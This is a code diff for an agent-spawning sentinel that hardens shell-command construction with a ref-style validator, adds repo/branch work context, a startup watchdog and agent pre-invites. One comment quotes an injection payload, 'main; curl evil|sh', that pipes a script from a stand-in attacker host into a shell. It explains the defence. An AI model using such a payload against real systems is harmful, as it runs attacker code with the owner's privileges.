@@ -47,6 +47,18 @@ import {
  * extensions defer to the sentinel instead of double-firing.
  */
 
+/**
+ * A string safe to interpolate into a SHELL COMMAND — the repo/line an
+ * agent is summoned onto reach a live terminal via herdr, so they are
+ * validated like git validates refs: letters, digits, dot, dash, slash,
+ * underscore, no `..`, bounded length. Not escaped — REFUSED. Exported
+ * so the source (workContextOf) and the sink (agentEnvCmd) share ONE
+ * definition of "safe", which is what keeps the boundary from drifting.
+ */
+export function isSafeWork(value: string | undefined): boolean {
+  return !!value && /^[\w][\w./-]{0,200}$/.test(value) && !value.includes("..");
+}
+
 const HERDR_SOCKET = path.join(os.homedir(), ".config", "herdr", "herdr.sock");
 const REGISTRY = path.join(os.homedir(), ".fez", "herdr-tabs.json");
 const PIDFILE = path.join(os.homedir(), ".fez", "sentinel.pid");
@@ -110,6 +122,8 @@ interface RegisteredTab {
   channels: string[];
   tabId: string;
   paneId: string;
+  /** Thread-scoped work: the repo + line this instance was cut onto. */
+  work?: { repo: string; line?: string };
 }
 function loadRegistry(): RegisteredTab[] {
   try {
@@ -179,10 +193,23 @@ async function main() {
   console.log(`   herdr: ${(await herdrAlive()) ? "connected — agents spawn as tabs" : "absent — agents spawn as detached processes"}`);
 
   // ── spawn paths ───────────────────────────────────────────────────────
-  const agentEnvCmd = (persona: string, channels: string[]) =>
-    `FEZ_AGENT_OWNER=${myPubkey} FEZ_RELAY=${relayUrls.join(",")} fez agent ${persona} -c ${channels.length > 0 ? channels.join(",") : "none"}`;
+  const agentEnvCmd = (persona: string, channels: string[], work?: { repo: string; line?: string }) => {
+    // The SINK: this string is typed into a live shell (herdr
+    // pane.send_text). Validating HERE, not only where `work` is built,
+    // is what makes the guard hold against a future caller that
+    // constructs a work object some other way — the boundary is the
+    // shell, so the check lives at the shell. Unsafe input is a bug in
+    // the caller, so throw rather than silently drop.
+    if (work && !isSafeWork(work.repo)) throw new Error(`unsafe repo name refused: ${work.repo}`);
+    if (work?.line && !isSafeWork(work.line)) throw new Error(`unsafe line name refused: ${work.line}`);
+    return (
+      `FEZ_AGENT_OWNER=${myPubkey} FEZ_RELAY=${relayUrls.join(",")}` +
+      (work ? ` FEZ_AGENT_REPO=${work.repo}${work.line ? ` FEZ_AGENT_BASE_BRANCH=${work.line}` : ""}` : "") +
+      ` fez agent ${persona} -c ${channels.length > 0 ? channels.join(",") : "none"}`
+    );
+  };
 
-  async function spawnAgent(persona: string, channels: string[]): Promise<void> {
+  async function spawnAgent(persona: string, channels: string[], work?: { repo: string; line?: string }): Promise<void> {
     if (await herdrAlive()) {
       const registered = loadRegistry();
       const prior = registered.find((t) => t.persona === persona);
@@ -190,14 +217,19 @@ async function main() {
       const created = await herdrCall("tab.create", { label: `fez:${persona}`, cwd: os.homedir(), focus: false });
       const tab = created.tab as { tab_id: string };
       const pane = created.root_pane as { pane_id: string };
-      await herdrCall("pane.send_text", { pane_id: pane.pane_id, text: agentEnvCmd(persona, channels) + "\n" });
-      saveRegistry([...registered.filter((t) => t.persona !== persona), { persona, channels, tabId: tab.tab_id, paneId: pane.pane_id }]);
+      await herdrCall("pane.send_text", { pane_id: pane.pane_id, text: agentEnvCmd(persona, channels, work) + "\n" });
+      saveRegistry([...registered.filter((t) => t.persona !== persona), { persona, channels, tabId: tab.tab_id, paneId: pane.pane_id, work }]);
       console.log(`🧬 spawned @${persona} in herdr tab ${tab.tab_id} (${channels.length > 0 ? channels.join(",") : "dm-only"})`);
     } else {
       fs.mkdirSync(LOG_DIR, { recursive: true });
       const log = fs.openSync(path.join(LOG_DIR, `${persona}.log`), "a");
       const child = spawn("fez", ["agent", persona, "-c", channels.length > 0 ? channels.join(",") : "none"], {
-        env: { ...process.env, FEZ_AGENT_OWNER: myPubkey, FEZ_RELAY: relayUrls.join(",") },
+        env: {
+          ...process.env,
+          FEZ_AGENT_OWNER: myPubkey,
+          FEZ_RELAY: relayUrls.join(","),
+          ...(work ? { FEZ_AGENT_REPO: work.repo, ...(work.line ? { FEZ_AGENT_BASE_BRANCH: work.line } : {}) } : {}),
+        },
         detached: true,
         stdio: ["ignore", log, log],
       });
@@ -220,6 +252,13 @@ async function main() {
         await relay.publish(event);
         return event;
       },
+      // Sign WITHOUT publishing — NIP-98 headers for relay HTTP
+      // surfaces (fez-git's push journal). Its absence here was
+      // invisible: the backend is cast into the extension API type, so
+      // the type checker saw the full NostrAccess while the object had
+      // a hole, and the first caller got a TypeError swallowed by its
+      // own network-error handling — a task that no-ops forever.
+      signEvent: (template: unknown) => client.signEvent(template as never),
       subscribe: (filters: unknown, handler: unknown) => relay.subscribe(filters as never, handler as never),
       query: (filters: unknown) => relay.query(filters as never),
       encrypt: (peer: string, plaintext: string) => client.encryptTo(peer, plaintext),
@@ -282,16 +321,163 @@ async function main() {
   let dmWatchLive = false;
   setTimeout(() => { dmWatchLive = true; }, 5000).unref?.();
 
-  function summon(persona: string, channels: string[], why: string): void {
+  function summon(persona: string, channels: string[], why: string, work?: { repo: string; line?: string }): void {
     if (spawning.has(persona) || !personaExists(persona) || agentProcessAlive(persona)) return;
     spawning.add(persona);
-    console.log(`✨ ${why} → summoning @${persona}`);
-    void spawnAgent(persona, channels)
-      .then(() => spawning.delete(persona))
+    console.log(`✨ ${why} → summoning @${persona}${work ? ` onto ${work.repo}:${work.line}` : ""}`);
+    void preInvite(persona)
+      .then(() => spawnAgent(persona, channels, work))
+      .then(() => {
+        spawning.delete(persona);
+        armSpawnWatchdog(persona, channels[0]);
+      })
       .catch((err) => {
         spawning.delete(persona);
         console.error(`⚠️  couldn't summon @${persona}: ${err instanceof Error ? err.message : err}`);
       });
+  }
+
+  /**
+   * The backstop for deaths the runtime cannot self-report — node
+   * missing in the tab's shell, the command never running at all. The
+   * runtime's own dying words (agent.ts main().catch) cover everything
+   * after it starts; this covers "it never started". One check, 90s
+   * after spawn: no announcement AND no process = say so in the channel
+   * that summoned it, as the owner — the silence that looked like
+   * slowness twice today must never be silent again.
+   */
+  function armSpawnWatchdog(persona: string, channelId: string | undefined): void {
+    if (!channelId) return;
+    setTimeout(() => {
+      if (!pendingInvites.has(persona) || agentProcessAlive(persona)) return;
+      pendingInvites.delete(persona);
+      console.error(`⚠️  @${persona} never started (no announce, no process)`);
+      void relay
+        .publish(
+          client.signEvent({
+            kind: KIND_CHANNEL_MESSAGE,
+            tags: [["h", channelId]],
+            content: `⚠️ @${persona} failed to start — its process died before announcing (check its herdr tab or ~/.fez/logs/${persona}.log)`,
+          })
+        )
+        .catch(() => {});
+    }, 90_000);
+  }
+
+  /**
+   * Roster the persona BEFORE its process exists.
+   *
+   * Agent keys are stable (agent:<name>, minted here if this is truly
+   * the first time), so the sentinel need not wait for the 47000
+   * announcement to know who to invite — and waiting cost a real
+   * afternoon: a repo agent's FIRST act is cloning, the clone is
+   * roster-gated, and the announce-then-invite order meant every cold
+   * spawn with a checkout died 403 in a tab nobody was watching. The
+   * announcement-driven invite stays (it covers agents summoned by
+   * other paths); this closes the gap for the ones we spawn ourselves.
+   */
+  async function preInvite(persona: string): Promise<void> {
+    try {
+      const { loadOrCreateKey } = await import("@fez/protocol");
+      const { getPublicKey } = await import("nostr-tools/pure");
+      const hexKey = loadOrCreateKey(`agent:${persona}`);
+      const pk = getPublicKey(Uint8Array.from(hexKey.match(/../g)!.map((b) => parseInt(b, 16))));
+      await inviteToWorkspace(pk);
+      attestAgent(pk);
+    } catch (err) {
+      // A failed pre-invite must not block the summon: the announce-time
+      // invite is still behind it, and a chat-only agent never needed one.
+      console.warn(`⚠️  pre-invite for @${persona} failed: ${err instanceof Error ? err.message : err}`);
+    }
+  }
+
+  /**
+   * The thread a mention lands in IS the assignment. A branch thread's
+   * root carries its marker (⑂ `name`, written by fez-git's thread task
+   * or /repo branch); a mention under it means "work here" — so the
+   * spawn is handed the repo (from the channel) and the LINE (from the
+   * root), and the workspace provider cuts `agent/<line>` from the
+   * line's tip. A mention outside any ⑂ thread summons exactly as
+   * before. Resolution is best-effort: if the root or channel can't be
+   * read, the summon proceeds without work context rather than not at
+   * all — an agent in the room beats an agent held up by a lookup.
+   */
+  /**
+   * A name that may ride into a SHELL COMMAND. agentEnvCmd types the
+   * work context into a live terminal via herdr, so these strings are
+   * validated like the git endpoints validate refs — not quoted, not
+   * escaped, REFUSED. A thread root is member-authored text; without
+   * this, ``⑂ \`main; curl evil|sh\` `` executed as the owner the
+   * moment anyone mentioned an agent under it (review finding F1).
+   */
+  const safeWork = (value: string | undefined): string | undefined =>
+    isSafeWork(value) ? value : undefined;
+
+  async function workContextOf(event: { tags: string[][] }, channelId: string): Promise<{ repo: string; line?: string } | undefined> {
+    try {
+      // The CHANNEL picks the repo: a mention anywhere in a repo channel
+      // assigns that repo, overriding the persona's standing default —
+      // an agent answering in #another-test while working cool-repo is
+      // exactly the confusion this exists to prevent.
+      //
+      // authors: the key this sentinel serves — every sibling consumer
+      // of 47101 filters by the owner, and an unfiltered query let ANY
+      // pubkey's forged channel event pick the repo on a non-enforcing
+      // relay (review finding F3). Defense in depth; the relay's
+      // membership policy is the first wall, not the only one.
+      const chans = (await relay.query([{ kinds: [47101], "#d": [channelId], authors: [myPubkey] }] as never)) as { created_at: number; content: string }[];
+      const latest = chans.sort((a, b) => b.created_at - a.created_at)[0];
+      if (!latest) return undefined;
+      const parsed = JSON.parse(latest.content) as { source?: string; meta?: { repo?: string } };
+      if (parsed.source !== "fez-git") return undefined;
+      const repo = safeWork(parsed.meta?.repo);
+      if (!repo) return undefined;
+
+      // The THREAD picks the line, when the mention is inside a ⑂ root.
+      const eTags = event.tags.filter((t) => t[0] === "e" && t[1]);
+      const rootId = (eTags.find((t) => t[3] === "root") ?? eTags[0])?.[1];
+      if (!rootId) return { repo };
+      const [root] = await relay.query([{ ids: [rootId] }] as never);
+      const marker = (root as { content?: string } | undefined)?.content?.match(/^⑂ `([^`]+)`/);
+      if (!marker) return { repo };
+      const branch = marker[1];
+      const line = safeWork(branch.includes("/") ? branch.slice(branch.indexOf("/") + 1) : branch);
+      // An unsafe line name degrades to repo-only context — the summon
+      // still happens, on the agent's default lane, and nothing of the
+      // hostile string survives to the shell.
+      return line ? { repo, line } : { repo };
+    } catch {
+      return undefined;
+    }
+  }
+
+  async function handleChannelMentions(event: { pubkey: string; content: string; tags: string[][] }, channelId: string): Promise<void> {
+    const work = await workContextOf(event, channelId);
+    for (const match of event.content.matchAll(/@([\w-]+)/g)) {
+      const persona = match[1].toLowerCase();
+      if (spawning.has(persona) || !personaExists(persona)) continue;
+      if (agentProcessAlive(persona)) {
+        // Running, but summoned into a channel it doesn't serve — or
+        // onto a DIFFERENT line: one process per persona, one body per
+        // line, so a line switch is a restart. Its previous branch is
+        // safe on the relay; pushed work is the only work that exists.
+        const entry = loadRegistry().find((t) => t.persona === persona);
+        const needsChannel = entry && !entry.channels.includes(channelId);
+        const needsLine = entry && work && (entry.work?.repo !== work.repo || (work.line !== undefined && entry.work?.line !== work.line));
+        if (entry && (needsChannel || needsLine)) {
+          spawning.add(persona);
+          pendingInvites.set(persona, { channelId });
+          console.log(needsLine ? `🔁 moving @${persona} onto line ${work?.line} (restart)` : `🔁 pulling @${persona} into a new channel (restart with union)`);
+          try { execSync(`pkill -f "(fez|cli\\.js) agent ${persona}"`, { stdio: "pipe" }); } catch { /* already gone */ }
+          void spawnAgent(persona, needsChannel ? [...entry.channels, channelId] : entry.channels, work ?? entry.work)
+            .then(() => spawning.delete(persona))
+            .catch(() => spawning.delete(persona));
+        }
+        continue;
+      }
+      pendingInvites.set(persona, { channelId });
+      summon(persona, [channelId], `mention by ${nameOf(event.pubkey)}`, work);
+    }
   }
 
   relay.subscribe(
@@ -351,27 +537,7 @@ async function main() {
         if (Number(event.tags.find((t) => t[0] === "depth")?.[1] ?? 0) >= MAX_CHAIN_DEPTH) return;
         const channelId = event.tags.find((t) => t[0] === "h")?.[1];
         if (!channelId) return;
-        for (const match of event.content.matchAll(/@([\w-]+)/g)) {
-          const persona = match[1].toLowerCase();
-          if (spawning.has(persona) || !personaExists(persona)) continue;
-          if (agentProcessAlive(persona)) {
-            // Running, but summoned into a channel it doesn't serve:
-            // restart with the union — one process per persona.
-            const entry = loadRegistry().find((t) => t.persona === persona);
-            if (entry && !entry.channels.includes(channelId)) {
-              spawning.add(persona);
-              pendingInvites.set(persona, { channelId });
-              console.log(`🔁 pulling @${persona} into a new channel (restart with union)`);
-              try { execSync(`pkill -f "(fez|cli\\.js) agent ${persona}"`, { stdio: "pipe" }); } catch { /* already gone */ }
-              void spawnAgent(persona, [...entry.channels, channelId])
-                .then(() => spawning.delete(persona))
-                .catch(() => spawning.delete(persona));
-            }
-            continue;
-          }
-          pendingInvites.set(persona, { channelId });
-          summon(persona, [channelId], `mention by ${nameOf(event.pubkey)}`);
-        }
+        void handleChannelMentions(event, channelId);
         return;
       }
 
